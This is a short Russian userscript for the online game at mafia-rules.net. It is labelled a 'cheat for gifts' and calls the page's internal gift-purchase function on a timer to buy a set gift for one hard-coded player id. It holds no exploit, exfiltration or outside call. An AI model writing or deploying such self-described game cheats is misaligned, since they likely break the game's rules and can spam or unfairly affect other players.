
// ==UserScript==
// @name Подарки
// @namespace https://www.bestmafia.com/
// @version 3.0
// @description Чит на подарки
// @author я
// @match http://www.mafia-rules.net/*
// @match https://www.mafia-rules.net/*
// @grant none
// @license MIT
 
// @downloadURL https://update.greasyfork.org/scripts/506935/%D0%9F%D0%BE%D0%B4%D0%B0%D1%80%D0%BA%D0%B8.user.js
// @updateURL https://update.greasyfork.org/scripts/506935/%D0%9F%D0%BE%D0%B4%D0%B0%D1%80%D0%BA%D0%B8.meta.js
// ==/UserScript==
 
 
var skolko = 1; //Количество
var count = 0; var interval = 200; IntervalID = setInterval(function(){ if(count<skolko) { _WND_proc('gifts', 'buy', {id: 1015, uid: 11673367, txt: '', cr: 1, hd: 1}, event); count++; } else { clearInterval(IntervalID) } } ,interval);
